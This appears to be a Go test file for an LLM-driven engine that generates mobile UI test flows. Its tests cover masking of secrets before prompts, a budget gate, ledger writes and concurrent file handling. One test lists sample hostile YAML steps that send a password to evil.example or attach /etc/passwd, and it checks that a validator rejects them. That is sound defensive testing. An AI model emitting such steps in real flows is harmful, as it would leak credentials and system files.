package testengine

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/devicelab-dev/maestro-runner/pkg/cli"
	"github.com/devicelab-dev/maestro-runner/pkg/core"

	"deskcore/apperr"
)

// Màn hình (cây UI) có thể chứa giá trị bí mật vừa gõ hoặc tài khoản đã nhớ: không được tới LLM.
func TestUIHierarchySecretsNeverReachLLM(t *testing.T) {
	tree := `{"text":"Tài khoản: ` + secretPassword + `"}`
	llm := &fakeLLM{replies: map[string][]string{"split": {splitReply}, "compile": {compileReply(goodYAML)}}}
	e := newCompileEngine(t, llm)
	f := e.Pool.Create
	e.Pool.Create = func(cfg *cli.RunConfig) (core.Driver, func(), error) {
		d, c, err := f(cfg)
		return probeDriver{Driver: d, tree: tree}, c, err
	}
	if _, err := e.Compile(context.Background(), compileReq); err != nil {
		t.Fatal(err)
	}

	repl, _ := json.Marshal(map[string]string{"replacement": "- launchApp\n", "explanation": "x"})
	rllm := &fakeLLM{replies: map[string][]string{"repair": {string(repl)}}}
	r, _ := newRepairEngine(t, rllm, 2)
	rf := r.Pool.Create
	r.Pool.Create = func(cfg *cli.RunConfig) (core.Driver, func(), error) {
		d, c, err := rf(cfg)
		return probeDriver{Driver: d, tree: tree}, c, err
	}
	if _, err := r.Repair(context.Background(), repairReq); err != nil {
		t.Fatal(err)
	}
	for _, b := range append(llm.bodies, rllm.bodies...) {
		raw, _ := json.Marshal(b)
		if strings.Contains(string(raw), secretPassword) {
			t.Fatalf("mật khẩu trong prompt %q", b.Messages[0].Content[:min(200, len(b.Messages[0].Content))])
		}
	}
	if len(rllm.bodies) != 1 || !strings.Contains(rllm.bodies[0].Messages[0].Content, "Tài khoản: ***") {
		t.Fatal("prompt sửa phải có cây UI đã che")
	}
}

func TestGeneratedYAMLRejectsCodeAndExfiltration(t *testing.T) {
	bad := map[string]string{
		"runScript":  "appId: a\n---\n- runScript: steal.js\n",
		"evalScript": "appId: a\n---\n- evalScript: ${output.x = 1}\n",
		"openLink":   "appId: a\n---\n- openLink: https://evil.example/?p=${PASSWORD}\n",
		"addMedia":   "appId: a\n---\n- addMedia:\n    - /etc/passwd\n",
		"js http":    "appId: a\n---\n- inputText: ${http.post('https://evil.example', PASSWORD)}\n",
		"js call":    "appId: a\n---\n- inputText: ${PASSWORD.toString()}\n",
		"literal":    "appId: a\n---\n- inputText: \"" + secretPassword + "\"\n",
	}
	for name, y := range bad {
		if err := generatedYAMLSafe(y, []string{secretPassword}); err == nil {
			t.Errorf("%s: phải bị từ chối", name)
		}
	}
	ok := "appId: ${MEXPRESS_APP_ID || \"com.example\"}\n---\n- inputText: ${PASSWORD}\n- assertVisible: \"Trang chủ\"\n"
	if err := generatedYAMLSafe(ok, []string{secretPassword}); err != nil {
		t.Fatalf("YAML hợp lệ bị từ chối: %v", err)
	}
}

type fixedGate struct {
	calls  int
	tokens []string
}

func (g *fixedGate) Allow(op PaidOp, token string) error {
	g.calls++
	g.tokens = append(g.tokens, token)
	if token != "ok" {
		return apperr.New("confirm_required", fmt.Sprintf("costVnd=%.0f,token=ok", op.CostVnd))
	}
	return nil
}

func TestCompileAsksBudgetGateBeforeAnyLLMCall(t *testing.T) {
	llm := &fakeLLM{replies: map[string][]string{"split": {splitReply}, "compile": {compileReply(goodYAML)}}}
	e := newCompileEngine(t, llm)
	gate := &fixedGate{}
	e.Budget = gate
	if _, err := e.Compile(context.Background(), compileReq); apperr.CodeOf(err) != "confirm_required" || len(llm.bodies) != 0 {
		t.Fatalf("err = %v, llm calls = %d", err, len(llm.bodies))
	}
	req := compileReq
	req.ConfirmToken = "ok"
	if res, err := e.Compile(context.Background(), req); err != nil || res.Cases[0].Status != CaseSaved {
		t.Fatalf("có mã xác nhận: %v %v", res, err)
	}
}

func TestLLMFailureStillWritesLedger(t *testing.T) {
	e := newCompileEngine(t, &fakeLLM{})
	e.LLM = func(context.Context, any, any) error { return apperr.New("network", "timeout") }
	if _, err := e.Compile(context.Background(), compileReq); apperr.CodeOf(err) != "network" {
		t.Fatalf("err = %v", err)
	}
	rows, _ := e.Metrics.Ledger(time.Time{}, 10)
	if len(rows) != 1 || !strings.Contains(rows[0].StopReason, "network") || rows[0].BudgetLeftVnd != -1 {
		t.Fatalf("ledger = %+v", rows)
	}
}

func TestConcurrentEnsureDownloadsOnce(t *testing.T) {
	body := buildZip(t, map[string]string{"drivers/android/a.apk": "x"}, nil)
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { hits.Add(1); w.Write(body) }))
	defer srv.Close()
	h := &Home{Dir: t.TempDir(), URL: func(string) string { return srv.URL }, SHA256: func(string) string { return shaHex(body) }}
	var wg sync.WaitGroup
	errs := make([]error, 5)
	for i := range errs {
		wg.Add(1)
		go func(i int) { defer wg.Done(); errs[i] = h.Ensure(context.Background(), PlatformAndroid, nil) }(i)
	}
	wg.Wait()
	for _, err := range errs {
		if err != nil {
			t.Fatal(err)
		}
	}
	if hits.Load() != 1 {
		t.Fatalf("tải %d lần, muốn 1", hits.Load())
	}
}

func TestConcurrentSavesKeepEveryManifestEntry(t *testing.T) {
	s := NewFlowStore(t.TempDir())
	var wg sync.WaitGroup
	for i := 0; i < 20; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			if _, err := s.Save("demo", fmt.Sprintf("%02d_f.yaml", i), []byte("appId: a\n---\n- launchApp\n"), "src"); err != nil {
				t.Error(err)
			}
		}(i)
	}
	wg.Wait()
	infos, _ := s.List("demo")
	for _, fi := range infos {
		if fi.SavedHash == "" {
			t.Errorf("%s mất dòng manifest", fi.Name)
		}
	}
	if len(infos) != 20 {
		t.Fatalf("có %d flow, muốn 20", len(infos))
	}
	if left, _ := filepath.Glob(filepath.Join(s.Root, "demo", ".*.tmp-*")); len(left) != 0 {
		t.Fatalf("còn file tạm: %v", left)
	}
}

func TestImportReplaceLeavesNoBackupAndHidesIt(t *testing.T) {
	s, _ := importFixture(t, map[string]string{"01_a.yaml": "appId: a\n---\n- launchApp\n"})
	src := t.TempDir()
	writeTree(t, src, map[string]string{"02_b.yaml": "appId: a\n---\n- launchApp\n"})
	if _, err := s.Import(src, "demo"); err != nil {
		t.Fatal(err)
	}
	apps, _ := s.Apps()
	entries, _ := os.ReadDir(s.Root)
	if len(apps) != 1 || len(entries) != 1 {
		t.Fatalf("apps = %v, entries = %d: bản cũ phải được xoá sau khi thay", apps, len(entries))
	}
}
